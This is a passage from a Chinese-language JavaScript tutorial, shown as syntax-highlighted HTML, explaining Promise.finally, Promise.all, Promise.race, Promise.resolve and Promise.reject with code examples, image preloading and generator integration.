class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'oh no'</span>, error);</span><br><span class="line">  <span class="comment">// 下面一行会报错，因为y没有声明</span></span><br><span class="line">  y + <span class="number">2</span>;</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'carry on'</span>, error);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// oh no [ReferenceError: x is not defined]</span></span><br><span class="line"><span class="comment">// carry on [ReferenceError: y is not defined]</span></span><br></pre></td></tr></table></figure><p>上面代码中，第二个<code>catch</code>方法用来捕获，前一个<code>catch</code>方法抛出的错误。</p><h2 id="Promise-prototype-finally"><a href="#Promise-prototype-finally" class="headerlink" title="Promise.prototype.finally()"></a>Promise.prototype.finally()</h2><p><code>finally</code>方法用于指定不管 Promise 对象最后状态如何，都会执行的操作。该方法是 ES2018 引入标准的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">promise</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> &#123;···&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;···&#125;)</span><br><span class="line">.finally(<span class="function"><span class="params">()</span> =&gt;</span> &#123;···&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，不管<code>promise</code>最后的状态，在执行完<code>then</code>或<code>catch</code>指定的回调函数以后，都会执行<code>finally</code>方法指定的回调函数。</p><p>下面是一个例子，服务器使用 Promise 处理请求，然后使用<code>finally</code>方法关掉服务器。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server.listen(port)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .finally(server.stop);</span><br></pre></td></tr></table></figure><p><code>finally</code>方法的回调函数不接受任何参数，这意味着没有办法知道，前面的 Promise 状态到底是<code>fulfilled</code>还是<code>rejected</code>。这表明，<code>finally</code>方法里面的操作，应该是与状态无关的，不依赖于 Promise 的执行结果。</p><p><code>finally</code>本质上是<code>then</code>方法的特例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">promise</span><br><span class="line">.finally(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 语句</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">promise</span><br><span class="line">.then(</span><br><span class="line">  result =&gt; &#123;</span><br><span class="line">    <span class="comment">// 语句</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; &#123;</span><br><span class="line">    <span class="comment">// 语句</span></span><br><span class="line">    <span class="keyword">throw</span> error;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>上面代码中，如果不使用<code>finally</code>方法，同样的语句需要为成功和失败两种情况各写一次。有了<code>finally</code>方法，则只需要写一次。</p><p>它的实现也很简单。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.prototype.finally = <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> P = <span class="keyword">this</span>.constructor;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.then(</span><br><span class="line">    value  =&gt; P.resolve(callback()).then(<span class="function"><span class="params">()</span> =&gt;</span> value),</span><br><span class="line">    reason =&gt; P.resolve(callback()).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123; <span class="keyword">throw</span> reason &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面代码中，不管前面的 Promise 是<code>fulfilled</code>还是<code>rejected</code>，都会执行回调函数<code>callback</code>。</p><p>从上面的实现还可以看到，<code>finally</code>方法总是会返回原来的值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// resolve 的值是 undefined</span></span><br><span class="line"><span class="built_in">Promise</span>.resolve(<span class="number">2</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, () =&gt; &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// resolve 的值是 2</span></span><br><span class="line"><span class="built_in">Promise</span>.resolve(<span class="number">2</span>).finally(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// reject 的值是 undefined</span></span><br><span class="line"><span class="built_in">Promise</span>.reject(<span class="number">3</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, () =&gt; &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// reject 的值是 3</span></span><br><span class="line"><span class="built_in">Promise</span>.reject(<span class="number">3</span>).finally(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;)</span><br></pre></td></tr></table></figure><h2 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h2><p><code>Promise.all</code>方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.all([p1, p2, p3]);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>Promise.all</code>方法接受一个数组作为参数，<code>p1</code>、<code>p2</code>、<code>p3</code>都是 Promise 实例，如果不是，就会先调用下面讲到的<code>Promise.resolve</code>方法，将参数转为 Promise 实例，再进一步处理。（<code>Promise.all</code>方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。）</p><p><code>p</code>的状态由<code>p1</code>、<code>p2</code>、<code>p3</code>决定，分成两种情况。</p><p>（1）只有<code>p1</code>、<code>p2</code>、<code>p3</code>的状态都变成<code>fulfilled</code>，<code>p</code>的状态才会变成<code>fulfilled</code>，此时<code>p1</code>、<code>p2</code>、<code>p3</code>的返回值组成一个数组，传递给<code>p</code>的回调函数。</p><p>（2）只要<code>p1</code>、<code>p2</code>、<code>p3</code>之中有一个被<code>rejected</code>，<code>p</code>的状态就变成<code>rejected</code>，此时第一个被<code>reject</code>的实例的返回值，会传递给<code>p</code>的回调函数。</p><p>下面是一个具体的例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成一个Promise对象的数组</span></span><br><span class="line"><span class="keyword">const</span> promises = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getJSON(<span class="string">'/post/'</span> + id + <span class="string">".json"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all(promises).then(<span class="function"><span class="keyword">function</span> (<span class="params">posts</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>promises</code>是包含 6 个 Promise 实例的数组，只有这 6 个实例的状态都变成<code>fulfilled</code>，或者其中有一个变为<code>rejected</code>，才会调用<code>Promise.all</code>方法后面的回调函数。</p><p>下面是另一个例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> databasePromise = connectDatabase();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> booksPromise = databasePromise</span><br><span class="line">  .then(findAllBooks);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userPromise = databasePromise</span><br><span class="line">  .then(getCurrentUser);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([</span><br><span class="line">  booksPromise,</span><br><span class="line">  userPromise</span><br><span class="line">])</span><br><span class="line">.then(<span class="function">(<span class="params">[books, user]</span>) =&gt;</span> pickTopRecommentations(books, user));</span><br></pre></td></tr></table></figure><p>上面代码中，<code>booksPromise</code>和<code>userPromise</code>是两个异步操作，只有等到它们的结果都返回了，才会触发<code>pickTopRecommentations</code>这个回调函数。</p><p>注意，如果作为参数的 Promise 实例，自己定义了<code>catch</code>方法，那么它一旦被<code>rejected</code>，并不会触发<code>Promise.all()</code>的<code>catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="string">'hello'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> e);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'报错了'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> e);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([p1, p2])</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e));</span><br><span class="line"><span class="comment">// ["hello", Error: 报错了]</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>p1</code>会<code>resolved</code>，<code>p2</code>首先会<code>rejected</code>，但是<code>p2</code>有自己的<code>catch</code>方法，该方法返回的是一个新的 Promise 实例，<code>p2</code>指向的实际上是这个实例。该实例执行完<code>catch</code>方法后，也会变成<code>resolved</code>，导致<code>Promise.all()</code>方法参数里面的两个实例都会<code>resolved</code>，因此会调用<code>then</code>方法指定的回调函数，而不会调用<code>catch</code>方法指定的回调函数。</p><p>如果<code>p2</code>没有自己的<code>catch</code>方法，就会调用<code>Promise.all()</code>的<code>catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="string">'hello'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'报错了'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([p1, p2])</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e));</span><br><span class="line"><span class="comment">// Error: 报错了</span></span><br></pre></td></tr></table></figure><h2 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h2><p><code>Promise.race</code>方法同样是将多个 Promise 实例，包装成一个新的 Promise 实例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.race([p1, p2, p3]);</span><br></pre></td></tr></table></figure><p>上面代码中，只要<code>p1</code>、<code>p2</code>、<code>p3</code>之中有一个实例率先改变状态，<code>p</code>的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给<code>p</code>的回调函数。</p><p><code>Promise.race</code>方法的参数与<code>Promise.all</code>方法一样，如果不是 Promise 实例，就会先调用下面讲到的<code>Promise.resolve</code>方法，将参数转为 Promise 实例，再进一步处理。</p><p>下面是一个例子，如果指定时间内没有获得结果，就将 Promise 的状态变为<code>reject</code>，否则变为<code>resolve</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.race([</span><br><span class="line">  fetch(<span class="string">'/resource-that-may-take-a-while'</span>),</span><br><span class="line">  <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'request timeout'</span>)), <span class="number">5000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">]);</span><br><span class="line">p.then(<span class="function"><span class="params">response</span> =&gt;</span> <span class="built_in">console</span>.log(response));</span><br><span class="line">p.catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(error));</span><br></pre></td></tr></table></figure><p>上面代码中，如果 5 秒之内<code>fetch</code>方法无法返回结果，变量<code>p</code>的状态就会变为<code>rejected</code>，从而触发<code>catch</code>方法指定的回调函数。</p><h2 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve()"></a>Promise.resolve()</h2><p>有时需要将现有对象转为 Promise 对象，<code>Promise.resolve</code>方法就起到这个作用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jsPromise = <span class="built_in">Promise</span>.resolve($.ajax(<span class="string">'/whatever.json'</span>));</span><br></pre></td></tr></table></figure><p>上面代码将 jQuery 生成的<code>deferred</code>对象，转为一个新的 Promise 对象。</p><p><code>Promise.resolve</code>等价于下面的写法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(<span class="string">'foo'</span>)</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(<span class="string">'foo'</span>))</span><br></pre></td></tr></table></figure><p><code>Promise.resolve</code>方法的参数分成四种情况。</p><p><strong>（1）参数是一个 Promise 实例</strong></p><p>如果参数是 Promise 实例，那么<code>Promise.resolve</code>将不做任何修改、原封不动地返回这个实例。</p><p><strong>（2）参数是一个<code>thenable</code>对象</strong></p><p><code>thenable</code>对象指的是具有<code>then</code>方法的对象，比如下面这个对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> thenable = &#123;</span><br><span class="line">  then: <span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    resolve(<span class="number">42</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>Promise.resolve</code>方法会将这个对象转为 Promise 对象，然后就立即执行<code>thenable</code>对象的<code>then</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> thenable = &#123;</span><br><span class="line">  then: <span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    resolve(<span class="number">42</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="built_in">Promise</span>.resolve(thenable);</span><br><span class="line">p1.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);  <span class="comment">// 42</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>thenable</code>对象的<code>then</code>方法执行后，对象<code>p1</code>的状态就变为<code>resolved</code>，从而立即执行最后那个<code>then</code>方法指定的回调函数，输出 42。</p><p><strong>（3）参数不是具有<code>then</code>方法的对象，或根本就不是对象</strong></p><p>如果参数是一个原始值，或者是一个不具有<code>then</code>方法的对象，则<code>Promise.resolve</code>方法返回一个新的 Promise 对象，状态为<code>resolved</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.resolve(<span class="string">'Hello'</span>);</span><br><span class="line"></span><br><span class="line">p.then(<span class="function"><span class="keyword">function</span> (<span class="params">s</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Hello</span></span><br></pre></td></tr></table></figure><p>上面代码生成一个新的 Promise 对象的实例<code>p</code>。由于字符串<code>Hello</code>不属于异步操作（判断方法是字符串对象不具有 then 方法），返回 Promise 实例的状态从一生成就是<code>resolved</code>，所以回调函数会立即执行。<code>Promise.resolve</code>方法的参数，会同时传给回调函数。</p><p><strong>（4）不带有任何参数</strong></p><p><code>Promise.resolve</code>方法允许调用时不带参数，直接返回一个<code>resolved</code>状态的 Promise 对象。</p><p>所以，如果希望得到一个 Promise 对象，比较方便的方法就是直接调用<code>Promise.resolve</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.resolve();</span><br><span class="line"></span><br><span class="line">p.then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码的变量<code>p</code>就是一个 Promise 对象。</p><p>需要注意的是，立即<code>resolve</code>的 Promise 对象，是在本轮“事件循环”（event loop）的结束时，而不是在下一轮“事件循环”的开始时。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'three'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'two'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'one'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// one</span></span><br><span class="line"><span class="comment">// two</span></span><br><span class="line"><span class="comment">// three</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>setTimeout(fn, 0)</code>在下一轮“事件循环”开始时执行，<code>Promise.resolve()</code>在本轮“事件循环”结束时执行，<code>console.log(&#39;one&#39;)</code>则是立即执行，因此最先输出。</p><h2 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject()"></a>Promise.reject()</h2><p><code>Promise.reject(reason)</code>方法也会返回一个新的 Promise 实例，该实例的状态为<code>rejected</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.reject(<span class="string">'出错了'</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> reject(<span class="string">'出错了'</span>))</span><br><span class="line"></span><br><span class="line">p.then(<span class="literal">null</span>, <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 出错了</span></span><br></pre></td></tr></table></figure><p>上面代码生成一个 Promise 对象的实例<code>p</code>，状态为<code>rejected</code>，回调函数会立即执行。</p><p>注意，<code>Promise.reject()</code>方法的参数，会原封不动地作为<code>reject</code>的理由，变成后续方法的参数。这一点与<code>Promise.resolve</code>方法不一致。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> thenable = &#123;</span><br><span class="line">  then(resolve, reject) &#123;</span><br><span class="line">    reject(<span class="string">'出错了'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.reject(thenable)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e === thenable)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>Promise.reject</code>方法的参数是一个<code>thenable</code>对象，执行以后，后面<code>catch</code>方法的参数不是<code>reject</code>抛出的“出错了”这个字符串，而是<code>thenable</code>对象。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="加载图片"><a href="#加载图片" class="headerlink" title="加载图片"></a>加载图片</h3><p>我们可以将图片的加载写成一个<code>Promise</code>，一旦加载完成，<code>Promise</code>的状态就发生变化。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> preloadImage = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> image = <span class="keyword">new</span> Image();</span><br><span class="line">    image.onload  = resolve;</span><br><span class="line">    image.onerror = reject;</span><br><span class="line">    image.src = path;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Generator-函数与-Promise-的结合"><a href="#Generator-函数与-Promise-的结合" class="headerlink" title="Generator 函数与 Promise 的结合"></a>Generator 函数与 Promise 的结合</h3><p>使用 Generator 函数管理流程，遇到异步操作的时候，通常返回一个<code>Promise</code>对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFoo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    resolve(<span class="string">'foo'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> g = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> foo = <span class="keyword">yield</span> getFoo();</span><br><span class="line">    <span class="built_in">console</span>.log(foo);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params">generator</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> it = generator();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (result.done) <span class="keyword">return</span> result.value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result.value.then(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> go(it.next(value));</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> go(it.throw(error));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  go(it.next());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">run(g);</span><br></pre></td></tr></table></figure><p>上面代码的 Generator 